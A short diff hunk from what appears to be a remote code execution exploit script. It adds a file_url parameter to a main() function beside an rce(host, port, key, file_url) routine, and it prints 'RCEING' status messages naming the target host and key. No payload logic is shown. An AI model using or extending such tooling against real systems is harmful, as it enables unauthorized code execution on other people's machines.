@@ -66,7 +66,7 @@ def rce(host, port, key, file_url):
     
     return True
 
-def main(key, host, port):
+def main(key, host, port, file_url):
     
     print(Fore.YELLOW + f"[?] Executing file." + Fore.RESET)
     print(Fore.YELLOW + f"[?] RCEING {host}:{port} with key {key}" + Fore.RESET)
